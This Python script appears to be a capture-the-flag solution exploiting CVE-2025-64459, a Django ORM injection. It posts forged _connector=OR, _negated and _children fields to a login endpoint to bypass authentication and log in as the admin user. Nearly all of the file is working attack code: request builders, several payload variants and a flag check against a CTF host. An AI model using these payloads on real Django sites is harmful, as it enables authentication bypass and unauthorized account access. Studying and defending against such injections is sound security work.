#!/usr/bin/env python3
"""
CVE-2025-64459 - Django ORM SQL Injection via _connector and _negated

The vulnerability: when user input is passed as **kwargs to QuerySet.get(),
Django's Q object accepts _connector and _negated as internal control parameters.

_connector: controls AND/OR logic between conditions (values: 'AND', 'OR')  
_negated: boolean that reverses/negates the entire query

The challenge: SiteUser.objects.get(**params) where params is built from POST.
sanitize() blocks __ but _connector and _negated use SINGLE underscore!

sanitize('_connector') = '_connector' (no __, unchanged!)
sanitize('_negated') = '_negated' (no __, unchanged!)

So we can inject:
- _connector=OR -> turns AND conditions into OR conditions!
  username=x OR password=x OR role=admin -> matches admin user (role=admin is true)
- _negated=True -> negates the entire query (may cause MultipleObjectsReturned)

CVE affects Django 5.2 < 5.2.8, our target uses 5.2.7!
"""
import requests, re, sys, urllib.parse

TARGET = "http://exp.cybergame.sk:7002"

def raw_post(fields):
    parts = [f"{urllib.parse.quote(k,safe='')}={urllib.parse.quote(str(v),safe='')}" for k,v in fields]
    r = requests.post(f"{TARGET}/login", data="&".join(parts),
                      headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=15)
    return r.status_code, r.text

def h1(body):
    m = re.search(r'<h1[^>]*>(.*?)</h1>', body)
    return m.group(1) if m else body[:200]

def check_flag(body, label=""):
    if "SK-CERT{" in body or "fake_flag" in body:
        m = re.search(r'SK-CERT\{[^}]+\}', body)
        flag = m.group(0) if m else "FLAG IN BODY"
        print(f"\n🚩🚩🚩 FLAG{' '+label if label else ''}: {flag} 🚩🚩🚩")
        print(f"Full body: {body}")
        sys.exit(0)

requests.post(f"{TARGET}/signup", data={"username":"ctfhacker","password":"ctfhacker123"}, timeout=10)

print("=== CVE-2025-64459 EXPLOIT: _connector=OR injection ===\n")

# First: confirm sanitize passes _connector through unchanged
print("[1] Verifying _connector is not sanitized...")
def sanitize(p):
    while '__' in p:
        p = p.replace('__', '_')
    return p
print(f"    sanitize('_connector') = {sanitize('_connector')!r}")  # should be '_connector'
print(f"    sanitize('_negated') = {sanitize('_negated')!r}")        # should be '_negated'
print()

# THE EXPLOIT:
# POST: username=x&password=x&role=admin&_connector=OR
# 
# params = {'username': 'x', 'password': 'x', 'role': 'admin', '_connector': 'OR'}
# SiteUser.objects.get(**params)
# 
# With _connector=OR:
# SQL becomes: WHERE username='x' OR password='x' OR role='admin'
# Admin has role='admin' -> condition is TRUE for admin user!
# 
# BUT: if multiple users match (e.g., admin AND other users with role=customer)...
# .get() raises MultipleObjectsReturned -> 500
# 
# We need EXACTLY ONE user to match.
# Adding additional constraints to narrow to just admin:
# username=x OR password=x OR role=admin <- multiple users might match
# 
# Try: using impossible values + role=admin with OR:
# username=IMPOSSIBLE OR password=IMPOSSIBLE OR role=admin
# -> Only admin matches (role=admin is true, others false for impossible values)

print("[2] MAIN EXPLOIT: _connector=OR with role=admin...")
# Approach 1: impossible username and password + role=admin + _connector=OR
impossible = "IMPOSSIBLE_VALUE_THAT_NO_USER_HAS_xyzxyz_12345678"
code, body = raw_post([
    ("username", impossible),
    ("password", impossible),
    ("role", "admin"),
    ("_connector", "OR"),
])
print(f"    _connector=OR + role=admin: HTTP {code}")
print(f"    Response: {h1(body)!r}")
check_flag(body, "_connector=OR+role=admin")
print()

# Approach 2: empty username/password + role=admin + OR
code, body = raw_post([
    ("username", ""),
    ("password", ""),
    ("role", "admin"),
    ("_connector", "OR"),
])
print(f"    _connector=OR + empty creds + role=admin: HTTP {code}")
print(f"    Response: {h1(body)!r}")
check_flag(body, "_connector=OR+empty+role=admin")
print()

# Approach 3: just role=admin + OR (username/password required by intersection check)
# The intersection check verifies 'username' and 'password' are in params.keys()
# With OR: username='x' OR password='x' OR role='admin'
# Admin satisfies role='admin' -> returns admin!
# BUT: other users might ALSO match if their username='x' or password='x'

# Try with our own credentials to avoid collision:
code, body = raw_post([
    ("username", "ctfhacker"),
    ("password", "ctfhacker123"),
    ("role", "admin"),
    ("_connector", "OR"),
])
print(f"    _connector=OR + our creds + role=admin: HTTP {code}")
print(f"    Response: {h1(body)!r}")
check_flag(body, "_connector=OR+ourcreds+role=admin")
print()

# The problem with OR: it might match MULTIPLE users (our user AND admin)
# If both ctfhacker AND admin match -> MultipleObjectsReturned -> 500

# APPROACH: Use _negated to invert the query
# _negated=True with username='x' AND password='x' AND role='customer'
# -> NOT (username='x' AND password='x' AND role='customer')
# -> Returns all users EXCEPT those with username='x' and password='x' and role='customer'
# -> If only admin remains... MultipleObjectsReturned (many customers)

print("[3] Testing _negated...")
code, body = raw_post([
    ("username", "IMPOSSIBLE"),
    ("password", "IMPOSSIBLE"),
    ("role", "customer"),
    ("_negated", "True"),
])
print(f"    _negated=True + impossible customer: HTTP {code}")
print(f"    Response: {body[:200]!r}")
print()

# REFINED EXPLOIT: 
# Use _connector=OR with role=admin
# To avoid MultipleObjectsReturned, add constraints that ONLY admin satisfies:
# username=<admin_username> OR password=<admin_pw> OR role='admin'
# 
# We don't know admin creds, but with OR:
# ANY condition being true matches the user.
# Admin matches because role='admin' is true.
# Our user might also match if username='ctfhacker' is one of the OR conditions.
# 
# FIX: Use values that NO customer has, so ONLY admin matches.
# username=IMPOSSIBLE OR password=IMPOSSIBLE OR role=admin
# -> Only admin (role=admin) satisfies any condition
# -> If exactly ONE user has role=admin -> SUCCESS!

print("[4] REFINED EXPLOIT: OR with truly impossible values to isolate admin...")
# Make sure the impossible value doesn't collide with any real user
for impossible_val in ["ZZZNOTAREALUSERNAME99999", "xyzzy_impossible_value", "!!IMPOSSIBLE!!"]:
    code, body = raw_post([
        ("username", impossible_val),
        ("password", impossible_val),
        ("role", "admin"),
        ("_connector", "OR"),
    ])
    print(f"    impossible={impossible_val!r}: HTTP {code}: {h1(body)!r}")
    check_flag(body, f"impossible={impossible_val}")
print()

# If we get MultipleObjectsReturned (500), it means multiple users have role=admin
# If we get Login failed (DoesNotExist), the OR didn't work as expected
# If we get Welcome back / flag -> SUCCESS!

print("[5] Testing with _connector lowercase variations...")
for conn_val in ["OR", "or", "Or", "AND", "and"]:
    code, body = raw_post([
        ("username", "IMPOSSIBLE_ZZZ"),
        ("password", "IMPOSSIBLE_ZZZ"),
        ("role", "admin"),
        ("_connector", conn_val),
    ])
    result = h1(body)
    print(f"    _connector={conn_val!r}: HTTP {code}: {result!r}")
    check_flag(body, f"connector={conn_val}")
print()

print("[6] What does the error say for _connector?")
code, body = raw_post([
    ("username", "ctfhacker"),
    ("password", "ctfhacker123"),
    ("_connector", "OR"),
])
print(f"    HTTP {code}: {body[:300]!r}")
check_flag(body, "just connector")
print()

print("[7] Testing _children injection (another Q internal)...")
code, body = raw_post([
    ("username", "ctfhacker"),
    ("password", "ctfhacker123"),
    ("_children", "test"),
])
print(f"    _children: HTTP {code}: {h1(body)!r}")
print()